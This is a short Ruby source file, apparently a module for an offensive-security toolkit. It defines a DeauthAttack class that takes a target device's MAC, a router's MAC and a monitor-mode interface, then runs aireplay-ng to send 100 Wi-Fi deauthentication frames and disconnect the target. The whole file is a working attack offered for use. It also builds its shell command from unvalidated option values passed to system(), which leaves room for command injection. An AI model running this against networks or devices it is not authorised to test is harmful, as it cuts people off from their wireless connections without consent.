if RUBY_PLATFORM !~ /linux/
  class DeauthAttack
    def initialize; end
    def set(option, value); end
    def run
      puts "Module is Linux-only."
    end
  end
else
  class DeauthAttack
    attr_accessor :target_mac, :router_mac, :interface

    def initialize
      @target_mac = nil
      @router_mac = nil
      @interface  = "wlan0mon"
    end

    def set(option, value)
      case option.downcase
      when "target_mac" then @target_mac = value
      when "router_mac" then @router_mac = value
      when "interface" then @interface = value
      end
    end

    def run
      return unless @target_mac && @router_mac && @interface
      cmd = "aireplay-ng --deauth 100 -a #{@router_mac} -c #{@target_mac} #{@interface}"
      system(cmd)
    rescue => e
      puts e.message
    end
  end
end